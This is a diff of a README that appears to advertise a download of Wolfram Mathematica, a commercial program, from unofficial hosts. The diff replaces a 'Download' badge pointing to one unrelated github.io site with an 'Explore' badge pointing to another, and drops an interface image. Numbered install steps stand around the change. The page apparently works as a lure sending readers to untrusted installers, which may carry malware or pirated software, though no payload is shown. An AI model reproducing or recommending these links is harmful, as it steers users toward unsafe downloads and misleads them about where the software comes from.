@@ -2,7 +2,7 @@
 
 ## 📥 Wolfram Mathematica
 
-[![⬇️ Mathematica](https://img.shields.io/badge/Download-Mathematica-red?style=for-the-badge&logo=wolfram)](https://svaefemic.github.io/.github/wolfram-mat)
+[![Explore Wolfram Mathematica](https://img.shields.io/badge/Explore-Wolfram%20Mathematica-B42318?style=flat-square)](https://wolfram-mathematica-algebra.github.io/.github/)
 
 ---
 
@@ -14,11 +14,6 @@
 4. Follow the on-screen installation instructions.  
 5. Launch **Mathematica** from the Start menu after setup.  
 
----
-
-<p align="center">
-  <img src="https://stpltrsrcscmnprdwus001.blob.core.windows.net/rsrcs/srm/images/wolfram-mathematica/10.4135_9781529772838-fig1.jpg" alt="Wolfram Mathematica Interface" width="700">
-</p>
 
 ---
 
